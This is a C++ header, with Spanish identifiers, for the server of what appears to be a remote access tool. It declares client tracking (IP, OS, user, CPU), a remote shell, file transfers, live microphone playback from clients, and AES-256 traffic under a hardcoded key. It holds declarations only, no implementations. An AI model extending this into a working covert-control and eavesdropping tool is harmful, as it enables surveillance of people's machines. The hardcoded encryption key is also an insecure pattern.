#include "headers.hpp"
#include "frame_client.hpp"
#ifndef _SERVER_H
#define _SERVER_H

struct TransferStatus {
    std::string strCliente;
    std::string strNombre;
    bool isUpload = false;
    u64 uTamano = 0;
    u64 uDescargado = 0;
};

struct Archivo_Descarga2 {
    std::string strNombre;
    FILE* iFP;
    u64 uTamarchivo;
    u64 uDescargado;
};

struct Cliente{
    SOCKET _sckCliente = INVALID_SOCKET;
    time_t _ttUltimaVez = 0;
    std::string _id;
    std::string _strIp;
    std::string _strSo;
    std::string _strUser;
    std::string _strCpu;
    bool _isBusy = false;
    bool _isRunningShell = false;
    std::unordered_map<std::string, struct Archivo_Descarga2> um_Archivos_Descarga2;
};

struct ClientConInfo{
    SOCKET _sckSocket;
    std::string _strPuerto;
    std::string _strIp;
};

namespace LogType{
    const int LogMessage = 100;
    const int LogError   = 101;
    const int LogWarning = 102;
}

class MyLogClass{
    public:
        wxTextCtrl *p_txtCtrl;
        void LogThis(std::string strLog, int iType);
        std::mutex log_mutex;

};

class MyListCtrl: public wxListCtrl{
    public:
        MyListCtrl(wxWindow *parent,
               const wxWindowID id, const wxPoint& pos, const wxSize& size, long style)
        : wxListCtrl(parent, id, pos, size, style){
           
        }

        void ShowContextMenu(const wxPoint& pos, long item);
        void OnContextMenu(wxContextMenuEvent& event);
        void OnInteractuar(wxCommandEvent& event);

    private:
        wxString strTmp = "";
        wxDECLARE_EVENT_TABLE();
};

class Cliente_Handler {
    private:
        
        std::thread p_thHilo;
        
    public:

        std::mutex mt_Archivos;

        FrameCliente* n_Frame = nullptr;

        std::unordered_map<std::string, struct Archivo_Descarga2> um_Archivos_Descarga2;
        
        struct Cliente p_Cliente;
        bool isRunning = false;

        Cliente_Handler(struct Cliente s_cliente) : p_Cliente(s_cliente) {}

        void Spawn_Handler();
        void Spawn_Thread();
        void CrearFrame(std::string strTitle, std::string strID);
        void EscribirSalidShell(std::string strSalida);

        void Log(std::string strMsg) {
            std::cout << "[" << this->p_thHilo.get_id() << "] " << strMsg << std::endl;
        }

        void Join_Thread() {
            if (this->p_thHilo.joinable()) {
                this->p_thHilo.join();
            }
        }
};

class Servidor{
    private:
        
        SOCKET sckSocket = INVALID_SOCKET;
        u_int uiPuertoLocal = 0;
        WSADATA wsa;
        struct sockaddr_in structServer;

        unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
                                  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };

        ByteArray bKey;
        void Init_Key();
        int p_PingTime = 1000 * 60; //60 segundos
        
    public:
        Servidor();

        std::mutex p_mutex;
        std::mutex p_transfers;
        std::mutex count_mutex;

        std::unordered_map<SOCKET, struct Cliente> um_Clientes;

        std::vector<struct TransferStatus> vcTransferencias;
        std::vector<Cliente_Handler*> vc_Clientes;
        
        bool p_Escuchando = false;
        bool p_Transferencias = false;
        int iCount = 0;

        std::thread thListener;
        std::thread thPing;
        std::thread thCleanVC;
        std::thread thTransfers;
      

        //Hilos
        void m_Handler();
        void m_StopHandler();
        void m_JoinThreads();
        void m_Escucha();
        void m_Ping();
        void m_CleanVector();
        void m_MonitorTransferencias();

        //Manipular listview
        MyListCtrl *m_listCtrl;
        MyLogClass *m_txtLog;
        void m_InsertarCliente(struct Cliente& p_Cliente);
        void m_RemoverClienteLista(std::string p_ID);

        //Mic en tiempo real
        void m_ReproducirPaquete(char* pBuffer, size_t iLen);

        //Socket wraps
        int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false);
        int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock = false);

        //AES 256
        ByteArray bDec(const unsigned char* pInput, size_t pLen);
        ByteArray bEnc(const unsigned char* pInput, size_t pLen);

        //Server
        bool   m_Iniciar();
        ClientConInfo m_Aceptar();
        void m_CerrarConexiones();
        void m_CerrarConexion(SOCKET& pSocket);

        u_int m_lPuerto(){
            return uiPuertoLocal;
        }

        void m_sPuerto(int pNuevoPuerto){
            uiPuertoLocal = pNuevoPuerto;
        }

        ~Servidor(){
            if(sckSocket != INVALID_SOCKET){
                closesocket(sckSocket);
                sckSocket = INVALID_SOCKET;
            }

            if (m_txtLog != nullptr) {
                delete m_txtLog;
                m_txtLog = nullptr;
            }
       
        }
};

#endif